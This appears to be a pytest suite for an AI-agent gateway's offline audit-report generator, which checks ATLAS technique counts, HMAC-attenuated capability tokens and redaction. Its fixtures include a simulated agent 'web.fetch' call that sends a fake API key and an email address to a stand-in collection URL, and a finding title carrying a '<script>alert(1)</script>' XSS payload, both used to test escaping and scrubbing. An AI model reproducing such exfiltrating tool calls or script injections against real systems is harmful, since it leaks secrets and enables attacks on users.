"""Executive audit report from analyzer smoke fixtures. No honeypot, no network."""
from __future__ import annotations

import json
import shutil
import socket
from pathlib import Path

import pytest

from agent_gateway.audit_report import AuditInputError, load_audit_dir, write_report
from agent_gateway.capability import CAVEAT_DENY_EGRESS, attenuate, mint, serialize, taint_source_caveat
from agent_gateway.cli import main

FIX = Path(__file__).parent / "fixtures" / "audit"
TIER2 = FIX / "tier2-crawler"
ACCESS = FIX / "access-jsonl"
SECRET = "sk-abcdefghijklmnopqrstuvwxyz123456"
EMAIL = "user@example.com"


def _forbid_connect(monkeypatch: pytest.MonkeyPatch) -> None:
    def _blocked(*_args, **_kwargs):
        raise AssertionError("audit report opened a socket")

    monkeypatch.setattr(socket.socket, "connect", _blocked)
    monkeypatch.setattr(socket, "create_connection", _blocked)


def _assert_shell(out: Path, *, tool_calls: int) -> tuple[str, dict]:
    html = (out / "audit-report.html").read_text(encoding="utf-8")
    assert "Executive Summary" in html
    assert "Risk matrix" in html
    assert "Vulnerable to exfiltration" in html
    assert "Protected by agw1. HMAC attenuation" in html
    for tech in ("AML.T0051", "AML.T0080", "AML.T0086"):
        assert tech in html
    assert "src='replay.html'" in html or 'src="replay.html"' in html
    assert (out / "replay.html").is_file()
    assert "Content-Security-Policy" in (out / "replay.html").read_text(encoding="utf-8")
    pdf = (out / "audit-report.pdf").read_bytes()
    assert pdf.startswith(b"%PDF-")
    assert b"%%EOF" in pdf
    assert b"AML.T0051" in pdf
    doc = json.loads((out / "audit-report.json").read_text(encoding="utf-8"))
    assert doc["schema"] == "agent-gateway.audit-report/1"
    assert doc["honeypot_started"] is False
    assert doc["network"] is False
    assert doc["executive_summary"]["tool_calls"] == tool_calls
    assert "WeasyPrint" in doc["pdf_note"]
    return html, doc


def test_tier2_crawler_report_is_offline(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _forbid_connect(monkeypatch)
    bundle = (TIER2 / "stix-bundle.json").read_text(encoding="utf-8")
    assert "AML.T0051" in bundle  # catalog entry, not a match
    out = tmp_path / "report"
    write_report(TIER2, out)
    html, doc = _assert_shell(out, tool_calls=0)
    assert "t2-pw_crawler_headless-crawler-s100/access.jsonl" in html
    matches = doc["executive_summary"]["atlas_matches"]
    assert matches["AML.T0051"]["count"] == 0
    assert matches["AML.T0080"]["count"] == 0
    assert matches["AML.T0086"]["count"] == 0
    detail = {row["id"]: row["count"] for row in doc["atlas_detail"]}
    assert detail["AML.T0053"] == 1
    assert detail["AML.T0075"] == 1
    assert doc["executive_summary"]["taint_events"] == 0
    assert doc["inputs"]["events"] == 37
    assert doc["risk_matrix"]["vulnerable_exfiltration"] == []
    assert doc["risk_matrix"]["protected_agw1"] == []
    assert "No tool-call records" in html
    text = (out / "audit-report.pdf").read_bytes().decode("latin-1")
    assert "Tool calls: 0" in text


def test_access_jsonl_fixture_report(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _forbid_connect(monkeypatch)
    out = tmp_path / "report"
    captured: dict[str, str] = {}

    def _run() -> int:
        import io
        from contextlib import redirect_stdout

        buf = io.StringIO()
        with redirect_stdout(buf):
            code = main(["audit", str(ACCESS), "--out-dir", str(out)])
        captured["stdout"] = buf.getvalue()
        return code

    assert _run() == 0
    _html, doc = _assert_shell(out, tool_calls=0)
    stdout = json.loads(captured["stdout"])
    assert stdout["executive_summary"]["tool_calls"] == 0
    detail = {row["id"]: row["count"] for row in doc["atlas_detail"]}
    assert detail["AML.T0053"] == 1
    assert "agentwatch-analyzer/tests/fixtures/access.jsonl" in doc["source_log"]
    assert doc["inputs"]["events"] == 6
    assert doc["inputs"]["findings"] == 1


def test_risk_matrix_scrubs_secrets(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    _forbid_connect(monkeypatch)
    monkeypatch.setenv("AGENT_GATEWAY_HMAC_KEY", "test-hmac-key-agent-gateway-lab!!")
    src = tmp_path / "analyzer-out"
    shutil.copytree(ACCESS, src)
    protected = attenuate(
        attenuate(mint("sess-safe", "agk_demo_registered_0001"), CAVEAT_DENY_EGRESS),
        taint_source_caveat("untrusted-page"),
    )
    protected_token = serialize(protected)
    allowing_token = serialize(mint("sess-open", "agk_demo_registered_0001"))
    rows = [
        {
            "method": "tools/call",
            "tool_name": "web.fetch",
            "session_id": "sess-exfil",
            "tainted": True,
            "taint_source": "untrusted-page",
            "egress_class": "external_read",
            "arguments": {"url": "https://example.invalid/collect?q=1", "note": SECRET, "contact": EMAIL},
        },
        {
            "method": "tools/call",
            "tool_name": "send_email",
            "session_id": "sess-safe",
            "tainted": True,
            "egress_class": "send",
            "capability": protected_token,
            "arguments": {"to": "ops@internal.example", "body": "status"},
        },
        {
            "method": "tools/call",
            "tool_name": "web.fetch",
            "session_id": "sess-open",
            "tainted": True,
            "egress_class": "external_read",
            "capability": allowing_token,
            "arguments": {"url": "https://example.invalid/open?q=1"},
        },
        {
            "method": "tools/call",
            "tool_name": "update_ticket_status",
            "session_id": "sess-ok",
            "tainted": False,
            "arguments": {"id": "T-1", "status": "closed"},
        },
    ]
    with (src / "events.scrubbed.jsonl").open("a", encoding="utf-8") as fh:
        for row in rows:
            fh.write(json.dumps(row) + "\n")
        fh.write("not-json\n")
    findings = json.loads((src / "findings.json").read_text(encoding="utf-8"))
    findings["findings"].extend([
        {
            "rule_id": "R12",
            "title": "Taint on scratchpad </title><script>alert(1)</script>",
            "session_key": "sess-safe",
            "strength": 0.9,
            "summary": f"Inherited taint. Contact {EMAIL} token {SECRET}",
            "evidence": [],
            "atlas": ["AML.T0080.000"],
            "offline": False,
            "extra": {},
        },
        {
            "rule_id": "R12",
            "title": "External parameter egress",
            "session_key": "sess-exfil",
            "strength": 0.8,
            "summary": "Parameters on an external boundary while tainted.",
            "evidence": [],
            "atlas": ["AML.T0086"],
            "offline": False,
            "extra": {},
        },
        {
            "rule_id": "R12",
            "title": "Untrusted tool description",
            "session_key": "sess-open",
            "strength": 0.7,
            "summary": "Non-core tools/list ingest.",
            "evidence": [],
            "atlas": ["AML.T0051.001"],
            "offline": False,
            "extra": {},
        },
    ])
    (src / "findings.json").write_text(json.dumps(findings, indent=2) + "\n", encoding="utf-8")
    replay = src / "replay.html"
    replay.write_text(replay.read_text(encoding="utf-8") + f"\n<!-- {SECRET} {EMAIL} {protected_token} -->\n", encoding="utf-8")

    out = tmp_path / "report"
    doc = write_report(src, out)
    html = (out / "audit-report.html").read_text(encoding="utf-8")
    pdf = (out / "audit-report.pdf").read_bytes().decode("latin-1", errors="ignore")
    replay_out = (out / "replay.html").read_text(encoding="utf-8")
    dumped = json.dumps(doc)

    assert doc["executive_summary"]["tool_calls"] == 4
    assert doc["executive_summary"]["taint_events"] == 3
    matches = doc["executive_summary"]["atlas_matches"]
    assert matches["AML.T0051"]["count"] == 1
    assert matches["AML.T0080"]["count"] == 1
    assert matches["AML.T0086"]["count"] == 1
    assert {row["session"] for row in doc["risk_matrix"]["vulnerable_exfiltration"]} == {"sess-exfil", "sess-open"}
    protected_rows = doc["risk_matrix"]["protected_agw1"]
    assert len(protected_rows) == 1
    assert protected_rows[0]["tool"] == "send_email"
    assert protected_rows[0]["tainted"] is True
    assert "allow_egress=false" in protected_rows[0]["capability"]
    assert "HMAC verified" in protected_rows[0]["capability"]
    assert doc["risk_matrix"]["other_tool_calls"][0]["tool"] == "update_ticket_status"
    assert any("malformed" in note for note in doc["notes"])
    assert "<script>alert(1)</script>" not in html
    assert "&lt;script&gt;" in html
    for blob in (html, pdf, replay_out, dumped):
        assert SECRET not in blob
        assert EMAIL not in blob
        assert protected_token.split(".")[-1] not in blob
        assert allowing_token.split(".")[-1] not in blob
    assert "REDACTED" in html


def test_cli_rejects_incomplete_directory(tmp_path: Path):
    assert main(["audit", str(tmp_path / "missing")]) == 2
    empty = tmp_path / "empty"
    empty.mkdir()
    assert main(["audit", str(empty)]) == 2
    with pytest.raises(AuditInputError):
        load_audit_dir(empty)


def test_no_pdf_flag(tmp_path: Path):
    out = tmp_path / "report"
    assert main(["audit", str(ACCESS), "--out-dir", str(out), "--no-pdf"]) == 0
    assert (out / "audit-report.html").is_file()
    assert not (out / "audit-report.pdf").exists()
    doc = json.loads((out / "audit-report.json").read_text(encoding="utf-8"))
    assert doc["outputs"]["pdf"] is None
